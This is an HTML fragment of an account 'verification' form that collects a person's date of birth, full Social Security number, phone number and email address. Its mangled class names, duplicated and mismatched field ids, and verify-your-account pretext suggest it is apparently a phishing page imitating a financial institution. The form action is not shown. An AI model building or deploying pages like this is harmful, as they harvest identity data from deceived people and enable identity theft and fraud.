            ...
            <div class="account-content-container">
                <div class="account-table-body">
                    ...
                    <div class="account-title clearfix">
                                            <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please verify your Account details in the form below.</p>
                                    </div>
                            ...
                            <div class="js-user-block">
                                ...
                                <div class="unauth-form__row">
                                    <div class="uath-frm__rwtem g-left">
                                            ...
                                            <div>
                                                <input name="dob" type="text" data-toenable="accInfoLastFourSSN" placeholder="mm/dd/yyyy" data-slots="mdy" class="unauth-form__input datepicker unauth-ic-form__dateinput hasDatepicker" id="dp1608300128480" autocomplete="off" data-mask="00/00/0000" required="">
                                            </div>
                                    ...
                                    <div class="uath-frm__rwtem g-right">
                                        ...
                                        <div>
                                            <input name="ssn" placeholder="___-__-____" data-slots="_"  id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="tel"  required="">
                                        </div>
                                        <div class="unauth-form__block--guidance">
                                 ...
                                 <div class="unauth-form__row">
                                    ...
                                    <div class="uath-frm__rwtem g-left">
                                            ...
                                            <div>
                                                <input name="phn" placeholder="(___)___-____" data-slots="_" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="tel" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                    <div class="uath-frm__rwtem g-right">
                                        <label class="unauth-form__label" for="unauth-ic-form-ssn">Email:</label>
                                        <div>
                                            <input name="eml" placeholder="Enter Your Email Address" id="zip" class="unauth-form__input js-ssn-tin" type="email" autocomplete="off" required="">
                                        </div>
                                    </div>
                                </div>
                            </div>     
                ...
                <input type="submit" name="account_verify" class="submit-button g-right" tabindex="3" data-trigger="next" value="Submit">           
                </div>       </form>
